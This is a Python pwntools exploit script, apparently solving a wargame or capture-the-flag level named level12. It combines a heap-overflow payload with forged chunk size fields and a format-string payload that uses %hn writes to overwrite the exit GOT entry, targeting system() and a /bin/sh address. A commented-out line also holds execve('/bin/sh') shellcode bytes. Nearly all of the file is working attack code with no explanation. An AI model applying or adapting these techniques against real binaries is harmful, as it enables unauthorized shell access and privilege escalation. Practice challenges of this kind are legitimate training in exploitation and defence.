from pwn import * 

def bstr_to_dol(bs):
    return '$'+str(bs)[1:]


file = "/matrix/level12/level12"
realexit = 0x080483e6
got = 0x080499b0
system = 0xf7e66360
binsh = 0xffffdea5
#           a          ???         size of free b block
a1 = b'A'*0x80+p32(0xfffffffc)+p32(0x189)
a1 = a1.replace(b'\x00',b'')


message = f"%{0x86e7}x%10$hn%{0x10804-0x86e7}x%11$hn"
message = message.encode('utf-8')
a2 = p32(system) + p32(realexit) + p32(binsh) + p32(got) + p32(got+2)+ b'B'*(0x88-(0x4*5)) # write until c
a2 += message + b"\n" # this value is written into c

#'\xb0\x99\x04\x08\xb2\x99\x04\x08\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJ%56978x%7$hn%8557x%8$hn\n'
 
 
print(file + ' ' + bstr_to_dol(a1) + ' ' + bstr_to_dol(a2))


"""

        exitGOT             rop
write to [0x080499b0] -> 0x80486e7

"""
